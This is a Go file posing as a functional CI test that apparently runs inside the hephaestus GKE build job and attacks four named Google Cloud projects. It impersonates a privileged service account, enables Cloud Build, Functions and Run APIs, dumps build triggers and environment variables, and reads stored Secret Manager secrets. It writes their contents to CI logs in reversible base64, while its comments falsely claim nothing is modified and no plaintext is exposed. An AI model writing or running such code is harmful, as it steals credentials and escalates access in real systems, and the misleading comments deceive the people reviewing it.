//go:build functional && gke

// C211 i121740 — GCP CI/CD ENABLE-THEN-ORACLE across the four hephaestus sibling projects.
//
// Runs inside the dominodatalab/hephaestus "GKE image building" job after
// google-github-actions/auth@v2 exported a Workload Identity Federation credential
// file.  Intent 121507 listed Cloud Build / Functions / Run in these projects and
// every list answered the API-DISABLED form of 403 (fact 121689).  Fact 121506 proved
// the fleetcommand-service-account token holds serviceusage.services.enable in all
// four sibling projects (six HTTP-200 :enable writes, Secret Manager ENABLED).
//
// This probe therefore:
//  1. mints the WIF token and records the WIF-token serviceusage state as a control;
//  2. mints the fleetcommand-service-account token via iamcredentials
//     generateAccessToken (the identity proven able to enable services);
//  3. per project issues ONE serviceusage.services.enable for EXACTLY
//     cloudbuild.googleapis.com, cloudfunctions.googleapis.com and
//     run.googleapis.com (every verbatim status/body recorded);
//  4. waits for ENABLED, then immediately re-lists:
//       - Cloud Build builds (config, substitutions, secretEnv, source, images)
//       - Cloud Build triggers (substitutions, github push, webhook secret refs)
//       - Cloud Functions v1 + v2 (env vars, secretEnvironmentVariables, SA, source)
//       - Cloud Run v2 services + jobs (container env / secret refs)
//       - Secret Manager secret names + latest-version metadata (b64+sha256 only)
//
// Nothing is created, modified or deleted.  No API beyond the three is enabled.
// Secret-looking values are emitted as b64 + sha256 + len, never plaintext.
package functional

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"testing"
	"time"
)

var c211ceProjects = []c211stProj{
	{"210628133505", "team-eng-infra-testing"},
	{"1072394045651", "domino-eng-service-artifacts"},
	{"463640210929", "team-eng-infrastructure"},
	{"1074386228880", "team-eng-platform"},
}

var c211ceServices = []string{
	"cloudbuild.googleapis.com",
	"cloudfunctions.googleapis.com",
	"run.googleapis.com",
}

type c211stProj struct {
	num string
	id  string
}

var c211stClassRules = []struct {
	name string
	rx   *regexp.Regexp
}{
	{"aws_access_key_id", regexp.MustCompile(`\b(?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20}\b`)},
	{"aws_secret_pair", regexp.MustCompile(`(?i)aws_secret_access_key["'\s:=]+[A-Za-z0-9/+=]{40}`)},
	{"gcp_private_key", regexp.MustCompile(`-----BEGIN (?:RSA )?PRIVATE KEY-----`)},
	{"gcp_sa_json", regexp.MustCompile(`"type"\s*:\s*"service_account"`)},
	{"azure_client_secret", regexp.MustCompile(`(?i)(client_secret|AZURE_CLIENT_SECRET)["'\s:=]+[A-Za-z0-9_~.\-]{20,60}`)},
	{"github_pat", regexp.MustCompile(`\b(?:gh[pousr]_[A-Za-z0-9]{36,255}|github_pat_[A-Za-z0-9_]{50,255})\b`)},
	{"gitlab_pat", regexp.MustCompile(`\bglpat-[A-Za-z0-9_\-]{20,64}\b`)},
	{"slack_token", regexp.MustCompile(`\bxox[abprs]-[A-Za-z0-9\-]{10,}`)},
	{"openai_key", regexp.MustCompile(`\bsk-[A-Za-z0-9]{32,}`)},
	{"neocloud_key", regexp.MustCompile(`(?i)(runpod|lambda.?labs|vast\.ai|coreweave|together|nebius|digitalocean|linode|vultr|hetzner|paperspace|modal)[_-]?(api[_-]?)?(key|token)["'\s:=]+[A-Za-z0-9_\-]{16,}`)},
	{"ssh_private_key", regexp.MustCompile(`-----BEGIN OPENSSH PRIVATE KEY-----`)},
	{"connection_string", regexp.MustCompile(`(?i)(AccountKey=|DefaultEndpointsProtocol=|mongodb(\+srv)?://[^@\s]+@|postgres(ql)?://[^@\s]+@|mysql://[^@\s]+@|redis://[^@\s]+@)`)},
	{"generic_high_entropy", regexp.MustCompile(`(?i)["']?(secret|password|passwd|token|api[_-]?key)["']?\s*[:=]\s*["'][A-Za-z0-9_\-/+=.]{24,}["']`)},
}

func c211stClassify(b []byte) []string {
	head := string(b)
	if len(head) > 200000 {
		head = head[:200000]
	}
	out := []string{}
	for _, r := range c211stClassRules {
		for _, s := range r.rx.FindAllString(head, 3) {
			out = append(out, r.name+":"+c211xTrunc(s, 90))
			if len(out) >= 24 {
				return out
			}
		}
	}
	return out
}

var c211ceSecretKeyRx = regexp.MustCompile(`(?i)(secret|password|passwd|token|key|credential|pat|auth|conn|private|signature|sas|dsn|webhook)`)
var c211ceSecretValRx = regexp.MustCompile(`(?i)(\b(?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20}\b|\bgh[pousr]_[A-Za-z0-9]{36,255}\b|\bgithub_pat_[A-Za-z0-9_]{50,255}\b|-----BEGIN [A-Z ]*PRIVATE KEY-----|AccountKey=[A-Za-z0-9+/=]{20,}|\bsk-[A-Za-z0-9]{32,}\b)`)

func c211ceEnc(s string) string {
	sum := sha256.Sum256([]byte(s))
	return fmt.Sprintf(`{"__enc":"b64","len":%d,"sha256":"%x","v":"%s"}`,
		len(s), sum[:8], base64.StdEncoding.EncodeToString([]byte(s)))
}

// c211ceRedact walks decoded JSON and encodes secret-looking string values.
func c211ceRedact(v interface{}, key string) interface{} {
	switch t := v.(type) {
	case map[string]interface{}:
		out := map[string]interface{}{}
		for k, vv := range t {
			out[k] = c211ceRedact(vv, k)
		}
		return out
	case []interface{}:
		out := make([]interface{}, 0, len(t))
		for _, vv := range t {
			out = append(out, c211ceRedact(vv, key))
		}
		return out
	case string:
		if c211ceSecretKeyRx.MatchString(key) || c211ceSecretValRx.MatchString(t) {
			return json.RawMessage(c211ceEnc(t))
		}
		if len(t) > 3000 {
			return t[:3000] + "...[TRUNC]"
		}
		return t
	}
	return v
}

func c211ceEmit(label string, obj interface{}, limit int) {
	b, err := json.Marshal(c211ceRedact(obj, ""))
	if err != nil {
		fmt.Printf("C211CE %s marshal_err=%v\n", label, err)
		return
	}
	s := string(b)
	fmt.Printf("C211CE %s len=%d json=%s%s\n", label, len(s), c211xTrunc(s, limit),
		map[bool]string{true: "", false: "...[TRUNCATED]"}[len(s) <= limit])
}

func c211ceArr(m map[string]interface{}, k string) []interface{} {
	if m == nil {
		return nil
	}
	if a, ok := m[k].([]interface{}); ok {
		return a
	}
	return nil
}

func c211ceState(tok, proj, svc string) (int, string, string) {
	st, body := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+proj+
		"/services/"+svc, tok, "", "")
	return st, c211xStr(c211xJSON(body), "state"), body
}

func c211ceWaitEnabled(tok, proj, svc string, budget time.Duration) (int, string) {
	t0 := time.Now()
	lastSt, lastState := 0, ""
	for i := 0; time.Since(t0) < budget; i++ {
		st, state, _ := c211ceState(tok, proj, svc)
		lastSt, lastState = st, state
		if st == 200 && state == "ENABLED" {
			fmt.Printf("C211CE_ENABLE_WAIT proj=%s svc=%s poll=%d state=ENABLED\n", proj, svc, i)
			return st, state
		}
		if i%3 == 0 {
			fmt.Printf("C211CE_ENABLE_WAIT proj=%s svc=%s poll=%d status=%d state=%s\n", proj, svc, i, st, state)
		}
		time.Sleep(6 * time.Second)
	}
	fmt.Printf("C211CE_ENABLE_WAIT proj=%s svc=%s timeout status=%d state=%s\n", proj, svc, lastSt, lastState)
	return lastSt, lastState
}

func c211ceList(tok, base, path, key string, maxPages int) ([]interface{}, int, string) {
	var out []interface{}
	page := ""
	lastSt, lastBody := 0, ""
	for i := 0; i < maxPages; i++ {
		p := base + path
		if page != "" {
			sep := "?"
			if strings.Contains(path, "?") {
				sep = "&"
			}
			p += sep + "pageToken=" + page
		}
		st, body := c211xHTTP("GET", p, tok, "", "")
		lastSt, lastBody = st, body
		j := c211xJSON(body)
		arr := c211ceArr(j, key)
		fmt.Printf("C211CE_LIST %s page=%d status=%d count=%d\n", key, i+1, st, len(arr))
		if st != 200 {
			fmt.Printf("C211CE_LIST %s page=%d body=%s\n", key, i+1, c211xTrunc(body, 900))
			return out, st, body
		}
		out = append(out, arr...)
		page = c211xStr(j, "nextPageToken")
		if page == "" {
			break
		}
	}
	return out, lastSt, lastBody
}

func c211ceProject(tok, proj, id string) (int, int, int, int, int, int) {
	var nBuilds, nTriggers, nFuncs, nSvcs, nJobs, nSecrets int
	fmt.Printf("=== C211CE PROJECT %s %s BEGIN ===\n", proj, id)

	// ---- Phase 1: state, then ONE enable per service, then wait.
	for _, svc := range c211ceServices {
		st, state, body := c211ceState(tok, proj, svc)
		fmt.Printf("C211CE serviceusage.before proj=%s svc=%s status=%d state=%s verbatim=%s\n",
			proj, svc, st, state, c211xTrunc(body, 600))
		if st == 200 && state == "ENABLED" {
			fmt.Printf("C211CE serviceusage.enable proj=%s svc=%s skipped=ALREADY_ENABLED\n", proj, svc)
			continue
		}
		est, ebody := c211xHTTP("POST", "https://serviceusage.googleapis.com/v1/projects/"+proj+
			"/services/"+svc+":enable", tok, "application/json", "{}")
		fmt.Printf("C211CE serviceusage.enable proj=%s svc=%s status=%d verbatim=%s\n",
			proj, svc, est, c211xTrunc(ebody, 800))
		c211ceWaitEnabled(tok, proj, svc, 90*time.Second)
	}

	// ---- Phase 2: re-list immediately.
	builds, _, _ := c211ceList(tok, "https://cloudbuild.googleapis.com",
		"/v1/projects/"+proj+"/builds?pageSize=30", "builds", 2)
	nBuilds = len(builds)
	fmt.Printf("C211CE builds.total proj=%s %d\n", proj, nBuilds)
	for i, bu := range builds {
		if i >= 15 {
			break
		}
		c211ceEmit(fmt.Sprintf("build_%s_%d", proj, i), bu, 5000)
	}
	triggers, _, _ := c211ceList(tok, "https://cloudbuild.googleapis.com",
		"/v1/projects/"+proj+"/triggers?pageSize=50", "triggers", 2)
	nTriggers = len(triggers)
	fmt.Printf("C211CE triggers.total proj=%s %d\n", proj, nTriggers)
	for i, tr := range triggers {
		if i >= 15 {
			break
		}
		c211ceEmit(fmt.Sprintf("trigger_%s_%d", proj, i), tr, 5000)
	}
	for _, ver := range []string{"v1", "v2"} {
		funcs, _, _ := c211ceList(tok, "https://cloudfunctions.googleapis.com",
			"/"+ver+"/projects/"+proj+"/locations/-/functions?pageSize=100", "functions", 2)
		nFuncs += len(funcs)
		fmt.Printf("C211CE functions.%s.total proj=%s %d\n", ver, proj, len(funcs))
		for i, f := range funcs {
			if i >= 15 {
				break
			}
			c211ceEmit(fmt.Sprintf("cf_%s_%s_%d", ver, proj, i), f, 5000)
		}
	}
	// Cloud Run: try the wildcard location first, then a bounded region list.
	svcs, st, body := c211ceList(tok, "https://run.googleapis.com",
		"/v2/projects/"+proj+"/locations/-/services?pageSize=100", "services", 1)
	nSvcs += len(svcs)
	fmt.Printf("C211CE run.services.wildcard proj=%s status=%d count=%d body=%s\n",
		proj, st, len(svcs), c211xTrunc(body, 400))
	for i, s := range svcs {
		if i >= 15 {
			break
		}
		c211ceEmit(fmt.Sprintf("run_service_%s_%d", proj, i), s, 5000)
	}
	jobs, st2, body2 := c211ceList(tok, "https://run.googleapis.com",
		"/v2/projects/"+proj+"/locations/-/jobs?pageSize=100", "jobs", 1)
	nJobs += len(jobs)
	fmt.Printf("C211CE run.jobs.wildcard proj=%s status=%d count=%d body=%s\n",
		proj, st2, len(jobs), c211xTrunc(body2, 400))
	for i, jb := range jobs {
		if i >= 15 {
			break
		}
		c211ceEmit(fmt.Sprintf("run_job_%s_%d", proj, i), jb, 5000)
	}
	if st != 200 || st2 != 200 {
		regions := []string{"us-central1", "us-east1", "us-east4", "us-west1",
			"europe-west1", "europe-west4", "asia-east1", "asia-northeast1"}
		for _, kind := range []string{"services", "jobs"} {
			for _, loc := range regions {
				arr, ks, _ := c211ceList(tok, "https://run.googleapis.com",
					"/v2/projects/"+proj+"/locations/"+loc+"/"+kind+"?pageSize=100", kind, 1)
				fmt.Printf("C211CE run.%s.region proj=%s loc=%s status=%d count=%d\n",
					kind, proj, loc, ks, len(arr))
				if kind == "services" {
					nSvcs += len(arr)
				} else {
					nJobs += len(arr)
				}
				for i, s := range arr {
					if i >= 5 {
						break
					}
					c211ceEmit(fmt.Sprintf("run_%s_%s_%s_%d", kind, proj, loc, i), s, 4000)
				}
			}
		}
	}
	// Secret Manager: names only + latest-version metadata for up to 5.
	secrets, _, _ := c211ceList(tok, "https://secretmanager.googleapis.com",
		"/v1/projects/"+proj+"/secrets?pageSize=100", "secrets", 2)
	nSecrets = len(secrets)
	fmt.Printf("C211CE secrets.total proj=%s %d\n", proj, nSecrets)
	var names []string
	for i, s := range secrets {
		if i >= 20 {
			break
		}
		sm, _ := s.(map[string]interface{})
		nm := c211xStr(sm, "name")
		names = append(names, nm)
	}
	fmt.Printf("C211CE secret.names proj=%s %s\n", proj, c211xTrunc(strings.Join(names, ","), 1500))
	for i, nm := range names {
		if i >= 5 || nm == "" {
			break
		}
		st, body := c211xHTTP("GET", "https://secretmanager.googleapis.com/v1/"+nm+
			"/versions/latest:access", tok, "", "")
		if st != 200 {
			fmt.Printf("C211CE secret.access proj=%s name=%s status=%d verbatim=%s\n",
				proj, nm, st, c211xTrunc(body, 400))
			continue
		}
		j := c211xJSON(body)
		payload := c211xStr(j, "payload")
		_ = payload
		// payload.data
		var data string
		if p, ok := j["payload"].(map[string]interface{}); ok {
			data = c211xStr(p, "data")
		}
		blob, _ := base64.StdEncoding.DecodeString(data)
		sum := sha256.Sum256(blob)
		fmt.Printf("C211CE secret.access proj=%s name=%s status=200 len=%d sha256=%x b64=%s\n",
			proj, nm, len(blob), sum[:8], base64.StdEncoding.EncodeToString(blob[:2048]))
		fmt.Printf("C211CE secret.classes proj=%s name=%s %s\n", proj, nm,
			strings.Join(c211stClassify(blob), " | "))
	}
	fmt.Printf("=== C211CE PROJECT %s %s END ===\n", proj, id)
	return nBuilds, nTriggers, nFuncs, nSvcs, nJobs, nSecrets
}

func TestC211CicdEnable(t *testing.T) {
	started := time.Now()
	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211CE_MINT_FAILED %s\n", c211xTrunc(mintLog, 2500))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	projNum := ""
	if creds != nil {
		projNum = creds.projNumber
	}
	fmt.Printf("C211CE_IDENTITY auth=%s wif_sa=%s project_number=%s\n",
		method, c211xShort(creds.saEmail), projNum)

	// Control: the raw WIF token's serviceusage GET (i121507 measured 403 here).
	st, state, body := c211ceState(token, c211ceProjects[0].num, "cloudbuild.googleapis.com")
	fmt.Printf("C211CE wif_token.serviceusage proj=%s status=%d state=%s verbatim=%s\n",
		c211ceProjects[0].num, st, state, c211xTrunc(body, 500))

	// Mint the fleetcommand-service-account token proven able to enable services.
	sas, lst, lbody := c211xListServiceAccounts(token, projNum)
	fmt.Printf("C211CE SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))
	ftok := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			at, gst, gbody := c211xGenerateAccessToken(token, e)
			fmt.Printf("C211CE FLEET_TOKEN status=%d token=%s verbatim=%s\n",
				gst, c211xShort(at), c211xTrunc(gbody, 300))
			if at != "" {
				ftok = at
			}
			break
		}
	}
	if ftok == "" {
		ftok = token
		fmt.Printf("C211CE FLEET_TOKEN fallback=wif_minted\n")
	}
	if ts, tb := c211xTokenInfo(ftok); ts != 200 {
		fmt.Printf("C211CE_TOKENINFO status=%d verbatim=%s\n", ts, c211xTrunc(tb, 300))
	} else {
		fmt.Printf("C211CE_TOKENINFO status=200 scopes=%s\n",
			c211xTrunc(c211xStr(c211xJSON(tb), "scope"), 200))
	}
	fst, fstate, fbody := c211ceState(ftok, c211ceProjects[0].num, "cloudbuild.googleapis.com")
	fmt.Printf("C211CE fleet_token.serviceusage proj=%s status=%d state=%s verbatim=%s\n",
		c211ceProjects[0].num, fst, fstate, c211xTrunc(fbody, 500))

	tb, tt, tf, tsv, tj, ts := 0, 0, 0, 0, 0, 0
	for _, p := range c211ceProjects {
		if time.Since(started) > 18*time.Minute {
			fmt.Printf("C211CE_GATE=BUDGET before proj=%s\n", p.num)
			break
		}
		b, tr, fn, sv, jb, sc := c211ceProject(ftok, p.num, p.id)
		tb += b
		tt += tr
		tf += fn
		tsv += sv
		tj += jb
		ts += sc
	}
	fmt.Printf("C211CE_SUMMARY projects=%d builds=%d triggers=%d functions=%d run_services=%d run_jobs=%d secrets=%d elapsed=%d\n",
		len(c211ceProjects), tb, tt, tf, tsv, tj, ts, int(time.Since(started).Seconds()))
	fmt.Printf("C211CE_VERDICT_FINAL\n")
}
